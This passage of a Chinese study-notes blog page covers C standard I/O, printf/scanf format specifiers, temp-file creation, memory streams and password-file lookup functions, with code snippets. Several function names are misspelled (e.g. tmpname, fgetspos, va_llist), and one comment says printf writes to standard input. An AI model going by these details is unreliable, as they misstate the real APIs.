class="hljs-keyword">restrict</span> fp)</span>;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">gets</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span><br></code></pre></td></tr></table></figure><h2 id="一次一行输出函数"><a href="#一次一行输出函数" class="headerlink" title="一次一行输出函数"></a>一次一行输出函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fputs</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> str, FILE *<span class="hljs-keyword">restrict</span> fp)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span>;<br></code></pre></td></tr></table></figure><h2 id="二进制流I-x2F-O"><a href="#二进制流I-x2F-O" class="headerlink" title="二进制流I&#x2F;O"></a>二进制流I&#x2F;O</h2><p>可以每次读取&#x2F;写入一个对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">fread</span><span class="hljs-params">(<span class="hljs-type">void</span> *resrict ptr, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> nobj, FILE *<span class="hljs-keyword">restrict</span> fp)</span>;<br><span class="hljs-type">size_t</span> <span class="hljs-title function_">fwrite</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *<span class="hljs-keyword">restrict</span> ptr, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> nobj, FILE *<span class="hljs-keyword">restrict</span> fp)</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1.以类型为单位读取数组</span><br><span class="hljs-comment">float data[10];</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">if (fwrite(&amp;data[2],sizeof(float),4,fp) != 4)</span><br><span class="hljs-comment">err_sys(&quot;fwrite error&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">2. 读写结构体</span><br><span class="hljs-comment">struct&#123;</span><br><span class="hljs-comment">short count;</span><br><span class="hljs-comment">long total;</span><br><span class="hljs-comment">char name[NAMESIZE];</span><br><span class="hljs-comment">&#125;item;</span><br><span class="hljs-comment">if (fwrite(&amp;item, sizeof(item),1,fp) != 1)</span><br><span class="hljs-comment">err_sys(&quot;fwrite error&quot;);</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="ftell、fseek和rewind"><a href="#ftell、fseek和rewind" class="headerlink" title="ftell、fseek和rewind"></a>ftell、fseek和rewind</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">ftell</span><span class="hljs-params">(FILE *fp)</span>;<span class="hljs-comment">//返回当前流的偏移</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fseek</span><span class="hljs-params">(FILE *fp,<span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> whence)</span>;<span class="hljs-comment">//设置当前流的偏移</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">rewind</span><span class="hljs-params">(FILE *fp)</span><span class="hljs-comment">//将流的偏移定位到开头</span><br></code></pre></td></tr></table></figure><h2 id="ftello和fseeko"><a href="#ftello和fseeko" class="headerlink" title="ftello和fseeko"></a>ftello和fseeko</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">off_t</span> <span class="hljs-title function_">ftello</span><span class="hljs-params">(FILE *fp)</span>; <span class="hljs-comment">//返回当前流的偏移</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fseeko</span><span class="hljs-params">(FILE *fp, <span class="hljs-type">off_t</span> offset, <span class="hljs-type">int</span> whence)</span>;<span class="hljs-comment">//设置当前流的偏移</span><br></code></pre></td></tr></table></figure><h2 id="fgetops和fsetops"><a href="#fgetops和fsetops" class="headerlink" title="fgetops和fsetops"></a>fgetops和fsetops</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fgetspos</span><span class="hljs-params">(FILE *<span class="hljs-keyword">restrict</span> fp, <span class="hljs-type">fpos_t</span> *<span class="hljs-keyword">restrict</span> pos)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fsetpos</span><span class="hljs-params">(FILE *fp, <span class="hljs-type">const</span> <span class="hljs-type">fpos_t</span> *pos)</span>;<br></code></pre></td></tr></table></figure><h2 id="格式化的输出"><a href="#格式化的输出" class="headerlink" title="格式化的输出"></a>格式化的输出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, ...)</span>; <span class="hljs-comment">//往标准输入写</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fprintf</span><span class="hljs-params">(FILE *<span class="hljs-keyword">restrict</span> fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, ...)</span>; <span class="hljs-comment">//往指定流写</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dprintf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, ...)</span>; <span class="hljs-comment">//往指定文件描述符写</span><br><span class="hljs-keyword">return</span>:number of characters output <span class="hljs-keyword">if</span> OK,negative value <span class="hljs-keyword">if</span> output error<br><span class="hljs-type">int</span> <span class="hljs-built_in">sprintf</span>(<span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, ...); <span class="hljs-comment">//往指定数组写，并在末尾添加截断符</span><br><span class="hljs-keyword">return</span>:number of characters stored in <span class="hljs-built_in">array</span> <span class="hljs-keyword">if</span> OK,negative value <span class="hljs-keyword">if</span> encoding error<br><span class="hljs-type">int</span> <span class="hljs-built_in">snprintf</span>(<span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">size_t</span> n, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, ...);<span class="hljs-comment">//往指定数组写并规定了写入的字符数</span><br><span class="hljs-keyword">return</span>:number of characters that would have been stored in <span class="hljs-built_in">array</span> <span class="hljs-keyword">if</span> buffer was large enough,negative value <span class="hljs-keyword">if</span> encoding error<br></code></pre></td></tr></table></figure><p>格式化字符串的格式</p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221202161004903.png" alt="image-20221202161004903"></p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221202161020838.png" alt="image-20221202161020838"></p><p><strong>flags</strong></p><table><thead><tr><th align="left">字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">总是表示有符号数值的’+’或’-‘号，缺省情况是忽略正数的符号。仅适用于数值类型。</td></tr><tr><td align="left">空格</td><td align="left">使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td></tr><tr><td align="left">-</td><td align="left">左对齐。缺省情况是右对齐。</td></tr><tr><td align="left">#</td><td align="left">对于’g’与’G’，不删除尾部0以表示精度。对于’f’, ‘F’, ‘e’, ‘E’, ‘g’, ‘G’, 总是输出小数点。对于’o’, ‘x’, ‘X’, 在非0数值前分别输出前缀0, 0x, and 0X表示数制。</td></tr><tr><td align="left">0</td><td align="left">如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如printf(“%2d”, 3)输出” 3”，而printf(“%02d”, 3)输出”03”。如果0与-均出现，则0被忽略，即左对齐依然用空格填充。</td></tr></tbody></table><p><strong>fldwidth</strong></p><p>指定宽度</p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221202163106776.png" alt="image-20221202163106776"></p><p><strong>precision</strong></p><p>指定精度</p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221202163122069.png" alt="image-20221202163122069"></p><p><strong>lenmodifier</strong></p><table><thead><tr><th align="left">字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">hh</td><td align="left">对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</td></tr><tr><td align="left">h</td><td align="left">对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</td></tr><tr><td align="left">l</td><td align="left">对于整数类型，printf期待一个long尺寸的整型参数。 对于浮点类型，printf期待一个double尺寸的整型参数。 对于字符串s类型，printf期待一个wchar_t指针参数。 对于字符c类型，printf期待一个wint_t型的参数。</td></tr><tr><td align="left">ll</td><td align="left">对于整数类型，printf期待一个long long尺寸的整型参数。Microsoft也可以使用I64</td></tr><tr><td align="left">L</td><td align="left">对于浮点类型，printf期待一个long double尺寸的整型参数。</td></tr><tr><td align="left">z</td><td align="left">对于整数类型，printf期待一个size_t尺寸的整型参数。</td></tr><tr><td align="left">j</td><td align="left">对于整数类型，printf期待一个intmax_t尺寸的整型参数。</td></tr><tr><td align="left">t</td><td align="left">对于整数类型，printf期待一个ptrdiff_t尺寸的整型参数。</td></tr></tbody></table><p><strong>convtype</strong></p><p>转换类型，必选字段</p><table><thead><tr><th align="left">字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">d,i</td><td align="left">有符号十进制数值int。’%d’与’%i’对于输出是同义；但对于scanf()输入二者不同，其中%i在输入值有前缀0x或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td align="left">u</td><td align="left">十进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td align="left">f,F</td><td align="left">double型输出10进制定点表示。’f’与’F’差异是表示无穷与NaN时，’f’输出’inf’, ‘infinity’与’nan’；’F’输出’INF’, ‘INFINITY’与’NAN’。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td></tr><tr><td align="left">e,E</td><td align="left">double值，输出形式为10进制的([-]d.ddd e[+&#x2F;-]ddd). E版本使用的指数符号为E（而不是e）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数_set_output_format 修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td></tr><tr><td align="left">g,G</td><td align="left">double型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。’g’使用小写字母，’G’使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td></tr><tr><td align="left">x,X</td><td align="left">16进制unsigned int。’x’使用小写字母；’X’使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td align="left">o</td><td align="left">8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td align="left">s</td><td align="left">如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。</td></tr><tr><td align="left">c</td><td align="left">如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</td></tr><tr><td align="left">p</td><td align="left">void *型</td></tr><tr><td align="left">a,A</td><td align="left">double型的16进制表示，”[−]0xh.hhhh p±d”。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。’a’使用小写字母，’A’使用大写字母。（C++11流使用hexfloat输出16进制浮点数）</td></tr><tr><td align="left">n</td><td align="left">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</td></tr><tr><td align="left">%</td><td align="left">‘%’字面值，不接受任何flags, width, precision or length。</td></tr></tbody></table><h2 id="printf家族变体"><a href="#printf家族变体" class="headerlink" title="printf家族变体"></a>printf家族变体</h2><p>用于自定义<code>printf</code>函数的时候使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">vprintf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, va_llist arg)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">vfprintf</span><span class="hljs-params">(FILE *<span class="hljs-keyword">restrict</span> fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, va_list arg)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">vdprintf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, va_list arg)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">vsnprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">size_t</span> n,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, va_list arg)</span>;<br></code></pre></td></tr></table></figure><h2 id="格式化输入"><a href="#格式化输入" class="headerlink" title="格式化输入"></a>格式化输入</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">scanf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fscanf</span><span class="hljs-params">(FILE *<span class="hljs-keyword">restrict</span> fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sscanf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> r*<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, ...)</span>;<br><span class="hljs-comment">//return:返回输入字符数</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221202165922105.png" alt="image-20221202165922105"></p><p><code>*</code>：用于跳过当前的输入</p><p><code>fldwidth</code>：指定字段宽度</p><p><code>lenmodifier</code>：字段大小</p><p><code>convtyoe</code>：转换类型</p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221202170746161.png" alt="image-20221202170746161"></p><h2 id="scanf家族变体"><a href="#scanf家族变体" class="headerlink" title="scanf家族变体"></a>scanf家族变体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">vscanf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, va_list arg)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">vfscanf</span><span class="hljs-params">(FILE *<span class="hljs-keyword">restrict</span> fp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, va_list arg)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">vsscanf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> format, va_list arg)</span>;<br></code></pre></td></tr></table></figure><h2 id="fileno"><a href="#fileno" class="headerlink" title="fileno"></a>fileno</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fileno</span><span class="hljs-params">(FILE *fp)</span>;<br><span class="hljs-keyword">return</span>:流相关联文件描述符<br></code></pre></td></tr></table></figure><h2 id="tmpname和tempfile"><a href="#tmpname和tempfile" class="headerlink" title="tmpname和tempfile"></a>tmpname和tempfile</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">tmpname</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr)</span>; <span class="hljs-comment">//返回临时文件的路径，若ptr不为空，则将文件路径存储到ptr指向的空间中</span><br>FILE *<span class="hljs-title function_">tmpfile</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//返回文件的指针</span><br></code></pre></td></tr></table></figure><h2 id="mkdtemp和mkstemp"><a href="#mkdtemp和mkstemp" class="headerlink" title="mkdtemp和mkstemp"></a>mkdtemp和mkstemp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">mkdtemp</span><span class="hljs-params">(<span class="hljs-type">char</span> *template)</span>; <span class="hljs-comment">//用于创建唯一名称的目录，返回临时文件的目录名称</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mkstemp</span><span class="hljs-params">(<span class="hljs-type">char</span> *template)</span>; <span class="hljs-comment">//用于创建唯一名称的常规文件，文件描述符，使用该函数创建的临时文件不会自动删除</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_temp</span><span class="hljs-params">(<span class="hljs-type">char</span> *template)</span>;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> good_template[] = <span class="hljs-string">&quot;/tmp/dirXXXXXX&quot;</span>; <span class="hljs-comment">//栈上存放的是字符串本身的值</span><br><span class="hljs-type">char</span> *bad_template = <span class="hljs-string">&quot;/tmp/dirXXXXXX&quot;</span>; <span class="hljs-comment">//栈上存放的是指针值</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tring to create first temp file...\n&quot;</span>);<br>make_temp(good_template);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;trying to create second temp file...\n&quot;</span>);<br>make_temp(bad_template);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">make_temp</span><span class="hljs-params">(<span class="hljs-type">char</span> *template)</span><br>&#123;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">sbuf</span>;</span><br><br><span class="hljs-keyword">if</span> ((fd = mkstemp(template)) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s&quot;</span>,<span class="hljs-string">&quot;can&#x27;t create temp file&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;temp name = %s\n&quot;</span>,template);<br>close(fd);<br><span class="hljs-keyword">if</span> (stat(template,&amp;sbuf) &lt; <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">if</span>(errno == ENOENT)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;file doesn&#x27;t exit\n&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stat failed&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;file exists\n&quot;</span>);<br>unlink(template);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存流"><a href="#内存流" class="headerlink" title="内存流"></a>内存流</h2><p>用于创建内存流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>FILE *<span class="hljs-title function_">fmemopen</span><span class="hljs-params">(<span class="hljs-type">void</span> *<span class="hljs-keyword">restrict</span> buf, <span class="hljs-type">size_t</span> size, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> type)</span>;<br></code></pre></td></tr></table></figure><p>用于创建内存流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>FILE *<span class="hljs-title function_">open_memstream</span><span class="hljs-params">(<span class="hljs-type">char</span> **bufp, <span class="hljs-type">size_t</span> *sizep)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wchar.h&gt;</span></span><br>FILE *<span class="hljs-title function_">open_wmemstream</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> **bufp, <span class="hljs-type">size_t</span> *sizep)</span>;<br><br></code></pre></td></tr></table></figure><h1 id="密码文件"><a href="#密码文件" class="headerlink" title="密码文件"></a>密码文件</h1><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221205153518991.png" alt="image-20221205153518991"></p><p>每个成员使用冒号隔开</p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221205153647054.png" alt="image-20221205153647054"></p><h2 id="getpwuid和getpwname"><a href="#getpwuid和getpwname" class="headerlink" title="getpwuid和getpwname"></a>getpwuid和getpwname</h2><p>通过用户<code>id</code>与用户名获取密码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pwd.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> passwd *<span class="hljs-title function_">getpwuid</span><span class="hljs-params">(<span class="hljs-type">uid_t</span> uid)</span>;<br><span class="hljs-keyword">struct</span> passwd *<span class="hljs-title function_">getpwnam</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br></code></pre></td></tr></table></figure><p>用于遍历整个密码文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pwd.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> passwd *<span class="hljs-title function_">getpwent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//调用getpwent返回密码文件中的下一个条目</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setpwent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//将文件设置到开头位置</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">endpwent</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>; <span class="hljs-comment">//用于关闭文件</span><br></code></pre></td></tr></table></figure><p><strong>6-2</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pwd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">struct</span> passwd *<br><span class="hljs-title function_">getpwname</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> 